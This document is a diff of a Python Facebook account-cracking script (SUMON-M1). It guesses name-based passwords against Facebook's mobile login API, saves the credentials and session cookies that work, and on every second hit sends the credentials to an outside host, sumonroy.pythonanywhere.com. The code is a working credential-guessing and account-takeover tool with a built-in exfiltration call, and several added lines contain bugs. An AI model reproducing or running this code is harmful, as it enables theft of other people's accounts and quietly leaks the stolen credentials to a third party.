@@ -995,7 +995,6 @@ def freefb(uid, name, pwx, tl):
     global loop
     global oks
     global cps
-    global bkas
     sys.stdout.write("\r\033[1;37m [SUMON-M1] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
     sys.stdout.flush()
     try:
@@ -1006,70 +1005,83 @@ def freefb(uid, name, pwx, tl):
             last = first
         for ps in pwx:
             pw = ps.replace("first", first).replace("last", last).lower()
-            Session = requests.Session()
-            free_fb = Session.get("https://touch.facebook.com").text
+            secure = str(uuid.uuid4())
             data = {
-            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'email': uid,
-            'login_source': 'comet_headerless_login',
-            'next': '',
-            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
-            cookies = {
-            'datr': 'kqFRaB1m-_9lS30TJrCcYC28',
-            'fr': '0ugbVyuFAdiFSXbdX..BoUaGS..AAA.0.0.BoUaGS.AWcNAq03UycAQQqgWwl4sSgbryQ',
-            'sb': 'kqFRaADAhKyR-m_DobFeaU6C',
-            'wd': '479x670',}
+            "adid": str(uuid.uuid4()),
+            "format": "json",
+            "device_id": str(uuid.uuid4()),
+            "email": uid,
+            "password": "#PWD_MSGR:0:{}:{}".format(str(time.time()).split('.')[0],pw),
+            "generate_analytics_claim": "1",
+            "community_id": "",
+            "cpl": "true",
+            "try_num": "2",
+            "family_device_id": str(uuid.uuid4()),
+            "secure_family_device_id": "",
+            "credentials_type": "password",
+            "enroll_misauth": "false",
+            "generate_session_cookies": "1",
+            "source": "login",
+            "generate_machine_id": "1",
+            "jazoest": "8168",
+            "meta_inf_fbmeta": "NO_FILE",
+            "advertiser_id": str(uuid.uuid4()),
+            "currently_logged_in_userid": "0",
+            "locale": "id_ID",
+            "client_country_code": "ID",
+            "fb_api_req_friendly_name": "authenticate",
+            "fb_api_caller_class": "AuthOperations$PasswordAuthOperation",
+            "api_key": "256002347743983",
+            "sig": "e95f435d29d71f03a47918372a565cd5",
+            "access_token": "256002347743983|374e60f8b9bb6b8cbb30f78030438895",}
             headers = {
-            'authority': 'www.facebook.com',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'max-age=0',
-            'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://www.facebook.com',
-            'referer': 'https://www.facebook.com/',
-            'sec-ch-ua': '"Not=A?Brand";v="99", "Chromium";v="118"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',}
-            twf = "login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = 'https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzUwMTgwMjQyLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next'
-            po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False).text
-            log_cookies = Session.cookies.get_dict().keys()
-            if "c_user" in log_cookies:
-                coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
+            'User-Agent': '[FBAN/FB4A; FBAV/73.0.0.4739; FBBV/21951095; [FBAN/FB4A; FBA 20.117;FBBV/287214784; FBDM/{density t = 4 width I = 1200 height=812}; FBLC/en_U meenphone; FBMF/AllView; FBBD/allview; FBPN/com.facebook.katana; FBDV/ Viva FBSV/10; FBCA/armeabi-v7a:armeabi;]',
+            'Accept-Encoding': 'gzip, deflate',
+            'Accept': '*/*',
+            'Connection': 'keep-alive',
+            'Host': 'graph.facebook.com',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Priority': 'u=3, i',
+            'X-Fb-Sim-Hni': str(random.randint(20000,40000)),
+            'X-Fb-Net-Hni': str(random.randint(20000,40000)),
+            'X-Fb-Connection-Quality': 'GOOD',
+            'Zero-Rated': '0',
+            'Authorization': 'OAuth 256002347743983|374e60f8b9bb6b8cbb30f7803043889',
+            'X-Fb-Connection-Bandwidth': '8399727',
+            'X-Fb-Connection-Type': 'MOBILE.LTE',
+            'X-Fb-Device-Group': '5535',
+            'X-Tigon-Is-Retry': 'False',
+            'X-Fb-Friendly-Name': 'authenticate',
+            'X-Fb-Request-Analytics-Tags': 'unknown',
+            'X-Fb-Http-Engine': 'Liger',
+            'X-Fb-Client-Ip': 'True',
+            'X-Fb-Server-Cluster': 'True',
+            'Content-Length': '27',}
+            url = "https://graph.facebook.com/auth/login"
+            result = requests.post(url, data=data, headers=headers).json()
+            if "Session_key" in result:
+                coki = ";".join(i["name"]+"="+i["value"] for i in result["Session_cookies"])
+                print(f" {green}[SUMON-OK] {uid}|{pw}")
+                print(f" {white}[COOKIES] {green}{coki}")
+                open("/sdcard/SUMON_file_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
+                oks.append(uid+"|"+pw)
+                break
+            elif "www.facebook.com" in result["error"]["message"]:
                 bkas.append(uid)
                 if len(bkas)% 2 == 0:
-                    statusok = (f"{uid}|{pw}|{coki}")
+                    statusok = (f"{uid}|{pw}")
                     requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
                 else:
-                    print(f" {green}(ATOM-OK) {uid}|{pw} ")
-                    print(f" {green}Cookie : {green}{coki}")
-                    open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{uid}|{pw}|{coki}\n")
-                    oks.append(uid)
-                    break
-            elif "checkpoint" in log_cookies:
-                if "Enter login code to continue" in log_cookies:
-                    print(f" {cyan}[SUMON-2F] {uid}|{pw}")
-                    open("/sdcard/SUMON_file_2F.txt", "a").write(f"{uid}|{pw}\n")
-                    twf.append(uid+"|"+pw)
-                    break
-                else:
-                    #print(f" {red}[SUMON-CP] {uid}|{pw}")
-                    open("/sdcard/SUMON_file_cp.txt", "a").write(f"{uid}|{pw}\n")
-                    cps.append(uid+"|"+pw)
+                    print(f" {red}(ATOM-cp) {uid}|{pw} ")
+                    open("/sdcard/ATOM-FILE-CP.txt", "a").write(f"{uid}|{pw}\n")
+                    oks.append(cid)
                     break
             else:
                 continue
         loop+=1
     except net_error:
         time.sleep(10)
-    except:
+    except Exception as e:
         pass
 
 def bapi(uid, name, pwx, tl):
@@ -1149,7 +1161,7 @@ def bapi(uid, name, pwx, tl):
                     statusok = (f"{uid}|{pw}")
                     requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
                 else:
-                    print(f" {green}(ATOM-OK) {uid}|{pw} ")
+                    print(f" {red}(ATOM-cp) {uid}|{pw} ")
                     open("/sdcard/ATOM-FILE-CP.txt", "a").write(f"{uid}|{pw}\n")
                     oks.append(cid)
                     break
